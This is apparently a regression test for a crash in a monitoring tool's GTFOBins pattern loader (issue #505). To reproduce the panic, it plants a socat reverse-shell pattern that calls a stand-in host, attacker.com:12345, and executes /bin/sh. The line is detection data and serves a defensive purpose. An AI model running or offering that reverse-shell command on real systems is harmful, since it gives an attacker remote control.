"""
Repro for issue #505: panic "slice bounds out of range [:12] with length 11"
at session start when [monitoring] enabled = true.

Root cause: the host monitoring daemon's proc-event watcher loads the GTFOBins
exec-pattern DB at startup (ProcEventWatcher.Run -> loadExecPatterns), and
gtfobinsStripPlaceholders() panicked on the standard GTFOBins `socat` entry token
"tcp-connect:attacker.com:12345" — it computed `lower` once but reassigned `token`
inside the loop, so after the "attacker.com" match shortened the token to
"tcp-connect" (len 11), the "attacker" match's stale index (12) overran it
(token[:12]). The panic fires in a goroutine right after "monitoring started",
crashing the whole process — exactly the reporter's symptom. It only reproduces
when the GTFOBins DB is present (e.g. after `coi update-patterns`), which is why
it depends on the user's setup, not the dummy alone.

This test plants a minimal GTFOBins DB containing the triggering token, points
`[detection] gtfobins_dir` at it, enables monitoring, and starts a session — the
same code path runs for both a fresh `coi shell` and `coi shell --resume`
(patterns load at every session start). It asserts the coi process does not panic.
"""

import time
from pathlib import Path

from support.helpers import (
    spawn_coi,
    wait_for_container_ready,
)

PANIC_MARKERS = ("slice bounds out of range", "panic:", "runtime error:")

# A minimal GTFOBins entry whose reverse-shell code contains the exact token that
# triggered #505. The loader tokenises the code and feeds each token to
# gtfobinsStripPlaceholders, so this reproduces the parse-time panic.
TRIGGER_GTFOBINS_SOCAT = """\
functions:
  reverse-shell:
  - code: |-
      socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane
"""


def _write_trigger_gtfobins(base):
    """Create <base>/gtfobins/_gtfobins/socat with the triggering token."""
    gtfobins_dir = Path(base) / "gtfobins"
    bin_dir = gtfobins_dir / "_gtfobins"
    bin_dir.mkdir(parents=True, exist_ok=True)
    (bin_dir / "socat").write_text(TRIGGER_GTFOBINS_SOCAT)
    return gtfobins_dir


def _write_monitoring_config(gtfobins_dir):
    """Enable monitoring in trusted-scope config and point detection at the
    planted GTFOBins DB. Returns a restore() callable.

    [network] mode=open avoids CI false-positive network threats; high file-read
    thresholds avoid startup-noise HIGH threats; sigma_dir is set to a
    non-existent path so only the GTFOBins trigger is exercised.
    """
    config_path = Path.home() / ".coi" / "config.toml"
    backup = config_path.read_text() if config_path.exists() else None
    config_path.parent.mkdir(parents=True, exist_ok=True)
    config_path.write_text(
        f"""
[network]
mode = "open"

[monitoring]
enabled = true
auto_pause_on_high = true
auto_kill_on_critical = true
poll_interval_sec = 1
file_read_threshold_mb = 500
file_read_rate_mb_per_sec = 1000

[monitoring.nft]
enabled = false

[detection]
gtfobins_dir = "{gtfobins_dir}"
sigma_dir = "{gtfobins_dir}/does-not-exist"
"""
    )

    def restore():
        if backup is not None:
            config_path.write_text(backup)
        elif config_path.exists():
            config_path.unlink()

    return restore


def _raw_output(child):
    if hasattr(child.logfile_read, "get_raw_output"):
        return child.logfile_read.get_raw_output()
    if hasattr(child.logfile_read, "get_display_stripped"):
        return child.logfile_read.get_display_stripped()
    if hasattr(child.logfile_read, "get_output"):
        return child.logfile_read.get_output()
    return ""


def test_monitoring_gtfobins_load_does_not_panic(
    coi_binary, cleanup_containers, workspace_dir, tmp_path
):
    """Starting a session with monitoring + a GTFOBins DB must not panic (#505).

    The proc-event watcher loads the DB at session start; the buggy parser
    crashed the whole coi process in a goroutine. We start a session and watch
    for the panic signature, which (when present) appears right after
    "monitoring started".
    """
    env = {"COI_USE_DUMMY": "1"}
    gtfobins_dir = _write_trigger_gtfobins(tmp_path)
    restore = _write_monitoring_config(gtfobins_dir)

    child = None
    try:
        child = spawn_coi(coi_binary, ["shell"], cwd=workspace_dir, env=env, timeout=120)

        # The panic (if present) crashes coi in the monitoring goroutine shortly
        # after the container is set up. Wait for readiness (best-effort) then
        # watch the output for a panic marker or process exit.
        try:
            wait_for_container_ready(child, timeout=90)
        except Exception:
            pass

        deadline = time.time() + 30
        while time.time() < deadline:
            out = _raw_output(child).lower()
            if any(m in out for m in PANIC_MARKERS):
                break
            if not child.isalive():
                break
            time.sleep(1)

        output = _raw_output(child)
        lowered = output.lower()
        for marker in PANIC_MARKERS:
            assert marker not in lowered, (
                f"coi panicked while loading the GTFOBins DB under monitoring (issue #505).\n"
                f"Found {marker!r} in output:\n{output}"
            )
    finally:
        if child is not None:
            try:
                child.sendline("exit")
                time.sleep(0.3)
                child.sendline("sudo poweroff")
                time.sleep(1)
            except Exception:
                pass
            try:
                child.close(force=True)
            except Exception:
                pass
        restore()
